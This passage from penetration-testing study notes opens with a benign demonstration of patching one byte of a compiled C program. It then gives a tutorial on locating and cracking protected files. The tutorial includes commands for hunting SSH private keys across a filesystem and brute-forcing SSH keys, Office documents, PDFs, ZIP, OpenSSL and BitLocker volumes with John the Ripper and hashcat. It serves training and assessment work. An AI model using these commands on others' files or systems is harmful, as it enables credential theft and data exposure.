<p>Once the BIOS code has been executed, what happens next depends entirely on what is in the BIOS, although normally the BIOS will begin looking for a disk drive of some kind and start executing the instructions there (which is usually an operating system). From that point onward, the OS takes over and usually runs a shell which the user then uses to operate the computer.</p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="fun-stuff"><a class="header" href="#fun-stuff">Fun Stuff</a></h1>
<ul>
<li><a href="#modifying-machine-code-in-executables">modify machine code</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="modifying-machine-code-in-executables"><a class="header" href="#modifying-machine-code-in-executables">Modifying Machine Code in Executables</a></h1>
<p><strong>requires xxd and objdump</strong></p>
<p>We have a very simple program written in C that prints ‚Äúab‚Äù followed by a newline:</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;

int main() {
  putchar('a');
  putchar('b');
  putchar('\n');
}
</code></pre>
<p>Compile it:</p>
<pre><code class="language-bash">gcc -o main main.c
</code></pre>
<p>Now, let‚Äôs look at the machine code of the compiled executable using <code>objdump</code>:</p>
<pre><code class="language-bash">Œª workspace $ objdump -d main

main:     file format elf64-x86-64


Disassembly of section .init:

0000000000001000 &lt;_init&gt;:
    1000:       f3 0f 1e fa             endbr64
    1004:       48 83 ec 08             sub    $0x8,%rsp
    1008:       48 8b 05 c1 2f 00 00    mov    0x2fc1(%rip),%rax        # 3fd0 &lt;__gmon_start__@Base&gt;
    100f:       48 85 c0                test   %rax,%rax
    1012:       74 02                   je     1016 &lt;_init+0x16&gt;
    1014:       ff d0                   call   *%rax
    1016:       48 83 c4 08             add    $0x8,%rsp
    101a:       c3                      ret

Disassembly of section .plt:

0000000000001020 &lt;putchar@plt-0x10&gt;:
    1020:       ff 35 ca 2f 00 00       push   0x2fca(%rip)        # 3ff0 &lt;_GLOBAL_OFFSET_TABLE_+0x8&gt;
    1026:       ff 25 cc 2f 00 00       jmp    *0x2fcc(%rip)        # 3ff8 &lt;_GLOBAL_OFFSET_TABLE_+0x10&gt;
    102c:       0f 1f 40 00             nopl   0x0(%rax)

0000000000001030 &lt;putchar@plt&gt;:
    1030:       ff 25 ca 2f 00 00       jmp    *0x2fca(%rip)        # 4000 &lt;putchar@GLIBC_2.2.5&gt;
    1036:       68 00 00 00 00          push   $0x0
    103b:       e9 e0 ff ff ff          jmp    1020 &lt;_init+0x20&gt;

Disassembly of section .text:

0000000000001040 &lt;_start&gt;:
    1040:       f3 0f 1e fa             endbr64
    1044:       31 ed                   xor    %ebp,%ebp
    1046:       49 89 d1                mov    %rdx,%r9
    1049:       5e                      pop    %rsi
    104a:       48 89 e2                mov    %rsp,%rdx
    104d:       48 83 e4 f0             and    $0xfffffffffffffff0,%rsp
    1051:       50                      push   %rax
    1052:       54                      push   %rsp
    1053:       45 31 c0                xor    %r8d,%r8d
    1056:       31 c9                   xor    %ecx,%ecx
    1058:       48 8d 3d da 00 00 00    lea    0xda(%rip),%rdi        # 1139 &lt;main&gt;
    105f:       ff 15 5b 2f 00 00       call   *0x2f5b(%rip)        # 3fc0 &lt;__libc_start_main@GLIBC_2.34&gt;
    1065:       f4                      hlt
    1066:       66 2e 0f 1f 84 00 00    cs nopw 0x0(%rax,%rax,1)
    106d:       00 00 00
    1070:       48 8d 3d a1 2f 00 00    lea    0x2fa1(%rip),%rdi        # 4018 &lt;__TMC_END__&gt;
    1077:       48 8d 05 9a 2f 00 00    lea    0x2f9a(%rip),%rax        # 4018 &lt;__TMC_END__&gt;
    107e:       48 39 f8                cmp    %rdi,%rax
    1081:       74 15                   je     1098 &lt;_start+0x58&gt;
    1083:       48 8b 05 3e 2f 00 00    mov    0x2f3e(%rip),%rax        # 3fc8 &lt;_ITM_deregisterTMCloneTable@Base&gt;
    108a:       48 85 c0                test   %rax,%rax
    108d:       74 09                   je     1098 &lt;_start+0x58&gt;
    108f:       ff e0                   jmp    *%rax
    1091:       0f 1f 80 00 00 00 00    nopl   0x0(%rax)
    1098:       c3                      ret
    1099:       0f 1f 80 00 00 00 00    nopl   0x0(%rax)
    10a0:       48 8d 3d 71 2f 00 00    lea    0x2f71(%rip),%rdi        # 4018 &lt;__TMC_END__&gt;
    10a7:       48 8d 35 6a 2f 00 00    lea    0x2f6a(%rip),%rsi        # 4018 &lt;__TMC_END__&gt;
    10ae:       48 29 fe                sub    %rdi,%rsi
    10b1:       48 89 f0                mov    %rsi,%rax
    10b4:       48 c1 ee 3f             shr    $0x3f,%rsi
    10b8:       48 c1 f8 03             sar    $0x3,%rax
    10bc:       48 01 c6                add    %rax,%rsi
    10bf:       48 d1 fe                sar    $1,%rsi
    10c2:       74 14                   je     10d8 &lt;_start+0x98&gt;
    10c4:       48 8b 05 0d 2f 00 00    mov    0x2f0d(%rip),%rax        # 3fd8 &lt;_ITM_registerTMCloneTable@Base&gt;
    10cb:       48 85 c0                test   %rax,%rax
    10ce:       74 08                   je     10d8 &lt;_start+0x98&gt;
    10d0:       ff e0                   jmp    *%rax
    10d2:       66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)
    10d8:       c3                      ret
    10d9:       0f 1f 80 00 00 00 00    nopl   0x0(%rax)
    10e0:       f3 0f 1e fa             endbr64
    10e4:       80 3d 2d 2f 00 00 00    cmpb   $0x0,0x2f2d(%rip)        # 4018 &lt;__TMC_END__&gt;
    10eb:       75 33                   jne    1120 &lt;_start+0xe0&gt;
    10ed:       55                      push   %rbp
    10ee:       48 83 3d ea 2e 00 00    cmpq   $0x0,0x2eea(%rip)        # 3fe0 &lt;__cxa_finalize@GLIBC_2.2.5&gt;
    10f5:       00
    10f6:       48 89 e5                mov    %rsp,%rbp
    10f9:       74 0d                   je     1108 &lt;_start+0xc8&gt;
    10fb:       48 8b 3d 0e 2f 00 00    mov    0x2f0e(%rip),%rdi        # 4010 &lt;__dso_handle&gt;
    1102:       ff 15 d8 2e 00 00       call   *0x2ed8(%rip)        # 3fe0 &lt;__cxa_finalize@GLIBC_2.2.5&gt;
    1108:       e8 63 ff ff ff          call   1070 &lt;_start+0x30&gt;
    110d:       c6 05 04 2f 00 00 01    movb   $0x1,0x2f04(%rip)        # 4018 &lt;__TMC_END__&gt;
    1114:       5d                      pop    %rbp
    1115:       c3                      ret
    1116:       66 2e 0f 1f 84 00 00    cs nopw 0x0(%rax,%rax,1)
    111d:       00 00 00
    1120:       c3                      ret
    1121:       0f 1f 40 00             nopl   0x0(%rax)
    1125:       66 66 2e 0f 1f 84 00    data16 cs nopw 0x0(%rax,%rax,1)
    112c:       00 00 00 00
    1130:       f3 0f 1e fa             endbr64
    1134:       e9 67 ff ff ff          jmp    10a0 &lt;_start+0x60&gt;

0000000000001139 &lt;main&gt;:
    1139:       55                      push   %rbp
    113a:       48 89 e5                mov    %rsp,%rbp
    113d:       bf 61 00 00 00          mov    $0x61,%edi
    1142:       e8 e9 fe ff ff          call   1030 &lt;putchar@plt&gt;
    1147:       bf 62 00 00 00          mov    $0x62,%edi
    114c:       e8 df fe ff ff          call   1030 &lt;putchar@plt&gt;
    1151:       bf 0a 00 00 00          mov    $0xa,%edi
    1156:       e8 d5 fe ff ff          call   1030 &lt;putchar@plt&gt;
    115b:       b8 00 00 00 00          mov    $0x0,%eax
    1160:       5d                      pop    %rbp
    1161:       c3                      ret

Disassembly of section .fini:

0000000000001164 &lt;_fini&gt;:
    1164:       f3 0f 1e fa             endbr64
    1168:       48 83 ec 08             sub    $0x8,%rsp
    116c:       48 83 c4 08             add    $0x8,%rsp
    1170:       c3                      ret
</code></pre>
<p>That‚Äôs a lot of code! The part we‚Äôre interested in is the <code>main</code> function starting at address <code>0x1139</code>. We can focus this a bit by telling objdump to only dump the specific symbol we‚Äôre interested in (main). We also pass the <code>-f</code> flag to get some additional information about the file:</p>
<pre><code>Œª workspace $ objdump --disassemble=main -f main

main:     file format elf64-x86-64
architecture: i386:x86-64, flags 0x00000150:
HAS_SYMS, DYNAMIC, D_PAGED
start address 0x0000000000001040


Disassembly of section .init:

Disassembly of section .plt:

Disassembly of section .text:

0000000000001139 &lt;main&gt;:
    1139:       55                      push   %rbp
    113a:       48 89 e5                mov    %rsp,%rbp
    113d:       bf 61 00 00 00          mov    $0x61,%edi
    1142:       e8 e9 fe ff ff          call   1030 &lt;putchar@plt&gt;
    1147:       bf 62 00 00 00          mov    $0x62,%edi
    114c:       e8 df fe ff ff          call   1030 &lt;putchar@plt&gt;
    1151:       bf 0a 00 00 00          mov    $0xa,%edi
    1156:       e8 d5 fe ff ff          call   1030 &lt;putchar@plt&gt;
    115b:       b8 00 00 00 00          mov    $0x0,%eax
    1160:       5d                      pop    %rbp
    1161:       c3                      ret

Disassembly of section .fini:
</code></pre>
<p>The instruction at address <code>0x1142</code> is responsible for printing the character ‚Äòa‚Äô (ASCII 0x61). The instruction prior to that puts the value <code>0x61</code> (hex for ‚Äòa‚Äô) into the <code>edi</code> register, which is used as an argument to the <code>putchar</code> function. So, we first load the character ‚Äòa‚Äô into <code>edi</code>, then call <code>putchar</code>. <code>putchar</code> looks at <code>edi</code>, sees the value <code>0x61</code>, and prints ‚Äòa‚Äô.</p>
<p>The same can be said for the following two lines. However, at address <code>0x1147</code>, we load <code>0x62</code> (hex for ‚Äòb‚Äô) into <code>edi</code>, and at address <code>0x1151</code>, we load <code>0x0a</code> (hex for newline) into <code>edi</code>.</p>
<p>So, if we wanted to change the program to print ‚Äúac‚Äù instead of ‚Äúab‚Äù, we would need to change the instruction at address <code>0x1147</code> to load <code>0x63</code> (hex for ‚Äòc‚Äô) into <code>edi</code> instead of <code>0x62</code>. Simple.</p>
<p>To disassemble this into a hex dump, we can use <code>xxd</code>:</p>
<pre><code class="language-bash">
Œª workspace $ xxd main &gt; main.asm
Œª workspace $ cat main.asm

The dump is rather lengthy, so I'll only print out the relevant portion
.... redacted ....

00001050: f050 5445 31c0 31c9 488d 3dda 0000 00ff  .PTE1.1.H.=.....
00001060: 155b 2f00 00f4 662e 0f1f 8400 0000 0000  .[/...f.........
00001070: 488d 3da1 2f00 0048 8d05 9a2f 0000 4839  H.=./..H.../..H9
00001080: f874 1548 8b05 3e2f 0000 4885 c074 09ff  .t.H..&gt;/..H..t..
00001090: e00f 1f80 0000 0000 c30f 1f80 0000 0000  ................
000010a0: 488d 3d71 2f00 0048 8d35 6a2f 0000 4829  H.=q/..H.5j/..H)
000010b0: fe48 89f0 48c1 ee3f 48c1 f803 4801 c648  .H..H..?H...H..H
000010c0: d1fe 7414 488b 050d 2f00 0048 85c0 7408  ..t.H.../..H..t.
000010d0: ffe0 660f 1f44 0000 c30f 1f80 0000 0000  ..f..D..........
000010e0: f30f 1efa 803d 2d2f 0000 0075 3355 4883  .....=-/...u3UH.
000010f0: 3dea 2e00 0000 4889 e574 0d48 8b3d 0e2f  =.....H..t.H.=./
00001100: 0000 ff15 d82e 0000 e863 ffff ffc6 0504  .........c......
00001110: 2f00 0001 5dc3 662e 0f1f 8400 0000 0000  /...].f.........
00001120: c30f 1f40 0066 662e 0f1f 8400 0000 0000  ...@.ff.........
00001130: f30f 1efa e967 ffff ff55 4889 e5bf 6100  .....g...UH...a.
00001140: 0000 e8e9 feff ffbf 6200 0000 e8df feff  ........b....... &lt; HERE
00001150: ffbf 0a00 0000 e8d5 feff ffb8 0000 0000  ................
00001160: 5dc3 0000 f30f 1efa 4883 ec08 4883 c408  ].......H...H...
00001170: c300 0000 0000 0000 0000 0000 0000 0000  ................
00001180: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00001190: 0000 0000 0000 0000 0000 0000 0000 0000  ................

.... redacted ....

</code></pre>
<p>In the above hex dump, each line starts with an offset (e.g., <code>00001050</code>), followed by the hex representation of the bytes, and finally the ASCII representation on the right. To find the instruction at address <code>0x1147</code>, we need to calculate its offset in the file. The <code>main</code> function starts at <code>0x1139</code>, so the offset of <code>0x1147</code> is <code>0x1147 - 0x1139 = 0xE</code> (14 in decimal). Specifically, we need to look at he line starting with offset <code>00001140</code> and find the 14th byte in that line. I have marked it with <code>&lt; HERE</code> in the above dump. To change this to load <code>0x63</code> instead of <code>0x62</code>, we need to change the byte <code>62</code> to <code>63</code>.</p>
<p>This is the line we‚Äôre interested in:</p>
<pre><code>00001140: 0000 e8e9 feff ffbf 6200 0000 e8df feff  ........b....... &lt; HERE
</code></pre>
<p>And this is what we want to change it to:</p>
<pre><code>00001140: 0000 e8e9 feff ffbf 6300 0000 e8df feff  ........b....... &lt; Notice the 63 (0x63, i.e. 'c')
</code></pre>
<p>To do this, we can open the hex dump in a text editor, make the change, and then write it back to a binary file using <code>xxd</code>:</p>
<pre><code class="language-bash">Œª workspace $ xxd -r main.asm modified_main
</code></pre>
<p>We can then run the modified executable to see the results:</p>
<pre><code class="language-bash">Œª workspace $ ./modified_main
ac
</code></pre>
<p>As you can see, the program now prints ‚Äúac‚Äù instead of ‚Äúab‚Äù. By modifying the machine code directly, we were able to change the behavior of the program without recompiling the source code.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="infosec"><a class="header" href="#infosec">InfoSec</a></h1>
<h2 id="directory-map-33"><a class="header" href="#directory-map-33">Directory Map</a></h2>
<h3 id="generic"><a class="header" href="#generic">Generic</a></h3>
<ul>
<li><a href="#enumeration-1">enumeration</a></li>
<li><a href="#crawling">crawling</a></li>
<li><a href="infosec/robots-text.html">robots-text</a></li>
<li><a href="#shell-harnesses">shell-harnesses</a></li>
<li><a href="#shells-and-payloads">shell-payloads</a></li>
<li><a href="#well-known-uris">well-known-uris</a></li>
</ul>
<h3 id="htb"><a class="header" href="#htb">HTB</a></h3>
<ul>
<li><a href="#hydra-1">brute-forcing</a></li>
<li><a href="infosec/htb/enumeration.html">enumeration</a></li>
</ul>
<h3 id="vulnerabilities"><a class="header" href="#vulnerabilities">Vulnerabilities</a></h3>
<ul>
<li><a href="#cve-common-vulnerabilities-and-exposures">cve</a></li>
<li><a href="#cvss-common-vulnerability-scoring-system">cvss</a></li>
<li><a href="infosec/vulnerabilities/nessus.html">nessus</a></li>
<li><a href="infosec/vulnerabilities/openvas.html">openvas</a></li>
</ul>
<h3 id="file-transfers"><a class="header" href="#file-transfers">File Transfers</a></h3>
<ul>
<li><a href="#linux-file-transfer-methods">linux</a></li>
<li><a href="#windows-file-transfer-methods">windows</a></li>
</ul>
<h3 id="windows-1"><a class="header" href="#windows-1">Windows</a></h3>
<ul>
<li><a href="#windows-authentication-process">windows-auth</a></li>
<li><a href="#attacking-active-directory">ADDS</a></li>
<li><a href="#attacking-windows-credential-manager">credential manager</a></li>
<li><a href="#pass-the-hash-pth-attacks">pass-the-hash</a></li>
</ul>
<h3 id="linux-1"><a class="header" href="#linux-1">Linux</a></h3>
<ul>
<li><a href="#linux-authentication">linux-auth</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="cracking-protected-files-and-archives"><a class="header" href="#cracking-protected-files-and-archives">Cracking Protected Files and Archives</a></h1>
<p>The use of file encryption is often neglected in both private and professional contexts. Even today, emails containing job applications, account statements, or contracts are frequently sent without encryption‚Äîsometimes in violation of legal regulations. For example, within the European Union, the General Data Protection Regulation (GDPR) requires that personal data be encrypted both in transit and at rest. Nevertheless, it remains standard practice to discuss confidential topics or transmit sensitive data via email, which may be intercepted by attackers positioned to exploit these communication channels.</p>
<p>As more companies enhance their IT security infrastructure through training programs and security awareness seminars, it is becoming increasingly common for employees to encrypt sensitive files. Nevertheless, encrypted files can still be cracked and accessed with the right combination of wordlists and tools.</p>
<h2 id="encryption-methods"><a class="header" href="#encryption-methods">Encryption Methods</a></h2>
<p>In many cases, symmetric encryption algorithms such as AES-256 are used to securely store individual files or folders. In this method, the same key is used for both encryption and decryption.</p>
<p>For transmitting files, asymmetric encryption is typically employed, which uses two distinct keys: the sender encrypts the file with the recipient‚Äôs public key, and the recipient decrypts it using the corresponding private key.</p>
<hr>
<h2 id="hunting-for-encrypted-files-3"><a class="header" href="#hunting-for-encrypted-files-3">Hunting for Encrypted Files</a></h2>
<p>Many different extensions correspond to encrypted files‚Äîa useful reference list can be found on <a href="https://fileinfo.com/filetypes/encrypted">FileInfo</a>.</p>
<h3 id="find-common-encrypted-file-types-1"><a class="header" href="#find-common-encrypted-file-types-1">Find Common Encrypted File Types</a></h3>
<pre><code class="language-bash">for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*"); do
  echo -e "\nFile extension: " $ext
  find / -name *$ext 2&gt;/dev/null | grep -v "lib\|fonts\|share\|core"
done
</code></pre>
<p>Example output:</p>
<pre><code>File extension:  .od*
/home/cry0l1t3/Docs/document-temp.odt
/home/cry0l1t3/Docs/product-improvements.odp
/home/cry0l1t3/Docs/mgmt-spreadsheet.ods
</code></pre>
<p>If you encounter unfamiliar file extensions, use search engines to research the technology behind them.</p>
<hr>
<h2 id="hunting-for-ssh-keys-2"><a class="header" href="#hunting-for-ssh-keys-2">Hunting for SSH Keys</a></h2>
<p>SSH keys do not have standard file extensions. They can be identified by their header and footer values. SSH private keys always begin with <code>-----BEGIN [...] PRIVATE KEY-----</code>.</p>
<h3 id="find-ssh-private-keys-1"><a class="header" href="#find-ssh-private-keys-1">Find SSH Private Keys</a></h3>
<pre><code class="language-bash">grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2&gt;/dev/null
</code></pre>
<p>Example output:</p>
<pre><code>/home/jsmith/.ssh/id_ed25519:1:-----BEGIN OPENSSH PRIVATE KEY-----
/home/jsmith/.ssh/SSH.private:1:-----BEGIN RSA PRIVATE KEY-----
/home/jsmith/Documents/id_rsa:1:-----BEGIN OPENSSH PRIVATE KEY-----
</code></pre>
<h3 id="identifying-encrypted-ssh-keys"><a class="header" href="#identifying-encrypted-ssh-keys">Identifying Encrypted SSH Keys</a></h3>
<p>Some SSH keys are encrypted with a passphrase. With older PEM formats, encryption is visible in the header:</p>
<pre><code>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2109D25CC91F8DBFCEB0F7589066B2CC

8Uboy0afrTahejVGmB7kgvxkqJLOczb1I0/hEzPU1leCqhCKBlxYldM2s65jhflD
4/OH4ENhU7qpJ62KlrnZhFX8UwYBmebNDvG12oE7i21hB/9UqZmmHktjD3+OYTsD
</code></pre>
<p>Modern SSH keys appear the same whether encrypted or not. To check if a key is encrypted:</p>
<pre><code class="language-bash">ssh-keygen -yf ~/.ssh/id_ed25519
# Unencrypted: outputs public key
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIpNefJd834VkD5iq+22Zh59Gzmmtzo6rAffCx2UtaS6

ssh-keygen -yf ~/.ssh/id_rsa
# Encrypted: prompts for passphrase
Enter passphrase for "/home/jsmith/.ssh/id_rsa":
</code></pre>
<hr>
<h2 id="john-the-ripper-2john-tools"><a class="header" href="#john-the-ripper-2john-tools">John the Ripper 2john Tools</a></h2>
<p>JtR includes many scripts for extracting hashes from files. Find available tools:</p>
<pre><code class="language-bash">locate *2john*
</code></pre>
<p>Common 2john tools:</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Tool</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>ssh2john.py</code></td><td>SSH private keys</td></tr>
<tr><td><code>office2john.py</code></td><td>MS Office documents</td></tr>
<tr><td><code>pdf2john.py</code></td><td>PDF files</td></tr>
<tr><td><code>zip2john</code></td><td>ZIP archives</td></tr>
<tr><td><code>rar2john</code></td><td>RAR archives</td></tr>
<tr><td><code>7z2john.pl</code></td><td>7-Zip archives</td></tr>
<tr><td><code>keepass2john</code></td><td>KeePass databases</td></tr>
<tr><td><code>bitlocker2john</code></td><td>BitLocker volumes</td></tr>
<tr><td><code>gpg2john</code></td><td>GPG keys</td></tr>
<tr><td><code>putty2john</code></td><td>PuTTY private keys</td></tr>
<tr><td><code>truecrypt_volume2john</code></td><td>TrueCrypt volumes</td></tr>
<tr><td><code>dmg2john</code></td><td>macOS DMG files</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="cracking-encrypted-ssh-keys-1"><a class="header" href="#cracking-encrypted-ssh-keys-1">Cracking Encrypted SSH Keys</a></h2>
<p>Use <code>ssh2john.py</code> to extract the hash, then crack with JtR:</p>
<pre><code class="language-bash">ssh2john.py SSH.private &gt; ssh.hash
john --wordlist=rockyou.txt ssh.hash
</code></pre>
<p>Output:</p>
<pre><code>Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
1234         (SSH.private)
1g 0:00:00:00 DONE (2022-02-08 03:03) 16.66g/s 1747Kp/s 1747Kc/s 1747KC/s Knightsing..Babying
Session completed
</code></pre>
<p>View cracked password:</p>
<pre><code class="language-bash">john ssh.hash --show

SSH.private:1234

1 password hash cracked, 0 left
</code></pre>
<hr>
<h2 id="cracking-password-protected-documents-1"><a class="header" href="#cracking-password-protected-documents-1">Cracking Password-Protected Documents</a></h2>
<p>Most reports, documentation, and information sheets are distributed as Microsoft Office documents or PDFs.</p>
<h3 id="cracking-office-documents"><a class="header" href="#cracking-office-documents">Cracking Office Documents</a></h3>
<pre><code class="language-bash">office2john.py Protected.docx &gt; protected-docx.hash
john --wordlist=rockyou.txt protected-docx.hash
john protected-docx.hash --show

Protected.docx:1234

1 password hash cracked, 0 left
</code></pre>
<h3 id="cracking-pdf-files"><a class="header" href="#cracking-pdf-files">Cracking PDF Files</a></h3>
<pre><code class="language-bash">pdf2john.py PDF.pdf &gt; pdf.hash
john --wordlist=rockyou.txt pdf.hash
john pdf.hash --show

PDF.pdf:1234

1 password hash cracked, 0 left
</code></pre>
<hr>
<h2 id="cracking-protected-archives-3"><a class="header" href="#cracking-protected-archives-3">Cracking Protected Archives</a></h2>
<p>Archives allow organizing documents in a structured manner before compressing them into a single file. Many archive types support password protection.</p>
<h3 id="common-archive-types-1"><a class="header" href="#common-archive-types-1">Common Archive Types</a></h3>
<p>Common extensions include: <code>tar</code>, <code>gz</code>, <code>rar</code>, <code>zip</code>, <code>vmdb/vmx</code>, <code>cpt</code>, <code>truecrypt</code>, <code>bitlocker</code>, <code>kdbx</code>, <code>deb</code>, <code>7z</code>, and <code>gzip</code>.</p>
<h3 id="collecting-archive-extensions"><a class="header" href="#collecting-archive-extensions">Collecting Archive Extensions</a></h3>
<p>Query FileInfo for a comprehensive list:</p>
<pre><code class="language-bash">curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
</code></pre>
<p>Note: Not all archive types support native password protection. In such cases, additional tools like <code>openssl</code> or <code>gpg</code> are used to encrypt the files.</p>
<hr>
<h2 id="cracking-zip-files-1"><a class="header" href="#cracking-zip-files-1">Cracking ZIP Files</a></h2>
<pre><code class="language-bash">zip2john ZIP.zip &gt; zip.hash
cat zip.hash
# ZIP.zip/customers.csv:$pkzip2$1*2*2*0*2a*1e*490e7510*0*42*0*2a*490e*409b*ef1e7feb7c1cf701a6ada7132e6a5c6c84c032401536faf7493df0294b0d5afc3464f14ec081cc0e18cb*$/pkzip2$:customers.csv:ZIP.zip::ZIP.zip

john --wordlist=rockyou.txt zip.hash
john zip.hash --show

ZIP.zip/customers.csv:1234:customers.csv:ZIP.zip::ZIP.zip

1 password hash cracked, 0 left
</code></pre>
<hr>
<h2 id="cracking-openssl-encrypted-gzip-files-2"><a class="header" href="#cracking-openssl-encrypted-gzip-files-2">Cracking OpenSSL Encrypted GZIP Files</a></h2>
<p>GZIP files don‚Äôt natively support password protection and are often encrypted using <code>openssl</code>. Identify such files with the <code>file</code> command:</p>
<pre><code class="language-bash">file GZIP.gzip
# GZIP.gzip: openssl enc'd data with salted password
</code></pre>
<p>When cracking OpenSSL encrypted files, a reliable approach is to use <code>openssl</code> within a loop that attempts to extract contents directly:</p>
<pre><code class="language-bash">for i in $(cat rockyou.txt); do
  openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2&gt;/dev/null | tar xz
done
</code></pre>
<p>GZIP-related error messages can be safely ignored:</p>
<pre><code>gzip: stdin: not in gzip format
tar: Child returned status 1
tar: Error is not recoverable: exiting now
</code></pre>
<p>When the correct password is found, the file is extracted to the current directory:</p>
<pre><code class="language-bash">ls
# customers.csv  GZIP.gzip  rockyou.txt
</code></pre>
<hr>
<h2 id="cracking-bitlocker-encrypted-drives-2"><a class="header" href="#cracking-bitlocker-encrypted-drives-2">Cracking BitLocker-Encrypted Drives</a></h2>
<p>BitLocker is a full-disk encryption feature developed by Microsoft for Windows. Available since Windows Vista, it uses AES with 128-bit or 256-bit key lengths. If the password or PIN is forgotten, decryption can still be performed using a recovery key‚Äîa 48-digit string generated during setup.</p>
<h3 id="extracting-bitlocker-hashes"><a class="header" href="#extracting-bitlocker-hashes">Extracting BitLocker Hashes</a></h3>
<p>Use <code>bitlocker2john</code> to extract four different hashes:</p>
<ul>
<li>First two: BitLocker password</li>
<li>Last two: Recovery key (48-digit, randomly generated‚Äîimpractical to crack)</li>
</ul>
<pre><code class="language-bash">bitlocker2john -i Backup.vhd &gt; backup.hashes
grep "bitlocker\$0" backup.hashes &gt; backup.hash
cat backup.hash

# $bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f
</code></pre>
<h3 id="cracking-with-john-the-ripper"><a class="header" href="#cracking-with-john-the-ripper">Cracking with John the Ripper</a></h3>
<pre><code class="language-bash">john --wordlist=rockyou.txt backup.hash
</code></pre>
<h3 id="cracking-with-hashcat"><a class="header" href="#cracking-with-hashcat">Cracking with Hashcat</a></h3>
<p>The hashcat mode for <code>$bitlocker$0$...</code> hashes is <code>-m 22100</code>:</p>
<pre><code class="language-bash">hashcat -a 0 -m 22100 '$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f' /usr/share/wordlists/rockyou.txt
</code></pre>
<p>Output:</p>
<pre><code>Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 22100 (BitLocker)
Hash.Target......: $bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$10...8ec54f
Time.Started.....: Sat Apr 19 17:49:25 2025 (1 min, 56 secs)
Time.Estimated...: Sat Apr 19 17:51:21 2025 (0 secs)
Speed.#1.........:       25 H/s (9.28ms) @ Accel:64 Loops:4096 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2880/14344385 (0.02%)
Candidates.#1....: pirate -&gt; soccer9

$bitlocker$0$...:1234qwer
</code></pre>
<p>Note: BitLocker uses strong AES encryption, so cracking may take considerable time depending on hardware.</p>
<hr>
<h2 id="mounting-bitlocker-drives"><a class="header" href="#mounting-bitlocker-drives">Mounting BitLocker Drives</a></h2>
<h3 id="windows-2"><a class="header" href="#windows-2">Windows</a></h3>
<ol>
<li>Double-click the <code>.vhd</code> file (Windows will initially show an error since it‚Äôs encrypted)</li>
<li>After mounting, double-click the BitLocker volume</li>
<li>Enter the password when prompted</li>
</ol>
<h3 id="linux-or-macos"><a class="header" href="#linux-or-macos">Linux (or macOS)</a></h3>
<p>Install <code>dislocker</code>:</p>
<pre><code class="language-bash">sudo apt-get install dislocker
</code></pre>
<p>Create mount directories:</p>
<pre><code class="language-bash">sudo mkdir -p /media/bitlocker
sudo mkdir -p /media/bitlockermount
</code></pre>
<p>Configure VHD as loop device, decrypt, and mount:</p>
<pre><code class="language-bash">sudo losetup -f -P Backup.vhd
sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
</code></pre>
<p>Browse the files:</p>
<pre><code class="language-bash">cd /media/bitlockermount/
ls -la
</code></pre>
<p>Unmount when done:</p>
<pre><code class="language-bash">sudo umount /media/bitlockermount
sudo umount /media/bitlocker
</code></pre>
<hr>
<h2 id="hashcat-modes-for-files-and-archives"><a class="header" href="#hashcat-modes-for-files-and-archives">Hashcat Modes for Files and Archives</a></h2>
<h3 id="protected-files"><a class="header" href="#protected-files">Protected Files</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Mode</th><th>Type</th></tr>
</thead>
<tbody>
<tr><td><code>9400</code></td><td>MS Office 2007</td></tr>
<tr><td><code>9500</code></td><td>MS Office 2010</td></tr>
<tr><td><code>9600</code></td><td>MS Office 2013</td></tr>
<tr><td><code>10400</code></td><td>PDF 1.1-1.3 (Acrobat 2-4)</td></tr>
<tr><td><code>10500</code></td><td>PDF 1.4-1.6 (Acrobat 5-8)</td></tr>
<tr><td><code>10600</code></td><td>PDF 1.7 Level 3 (Acrobat 9)</td></tr>
<tr><td><code>10700</code></td><td>PDF 1.7 Level 8 (Acrobat 10-11)</td></tr>
<tr><td><code>13400</code></td><td>KeePass 1/2 AES/Twofish</td></tr>
<tr><td><code>22100</code></td><td>BitLocker</td></tr>
</tbody>
</table>
</div>
<h3 id="protected-archives"><a class="header" href="#protected-archives">Protected Archives</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Mode</th><th>Type</th></tr>
</thead>
<tbody>
